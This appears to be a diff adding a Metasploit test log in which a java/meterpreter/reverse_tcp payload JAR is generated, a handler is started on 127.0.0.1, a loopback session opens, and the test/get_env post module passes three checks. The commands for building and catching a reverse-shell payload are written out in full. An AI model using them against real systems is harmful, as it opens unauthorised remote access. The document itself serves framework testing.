@@ -1,0 +1,21 @@
+use java/meterpreter/reverse_tcp
+generate -o /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220119-3396-10g3klu.jar -f jar spawn=0 lport=6048 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5265 bytes to /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220119-3396-10g3klu.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 37
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6048 
+[*] Sending stage (58082 bytes) to 127.0.0.1
+[*] Meterpreter session 38 opened (127.0.0.1:6048 -> 127.0.0.1:39270 ) at 2022-01-19 01:07:46 +0000
+use test/get_env
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> run session=38 addentropy=true verbose=true
+
+[*] Running against session 38
+[*] Session type is meterpreter and platform is linux
+[+] should return user
+[+] should handle $ sign
+[+] should return multiple envs
+[*] Testing complete in 0.016468387
+[*] Passed: 3; Failed: 0
+[*] Post module execution completed
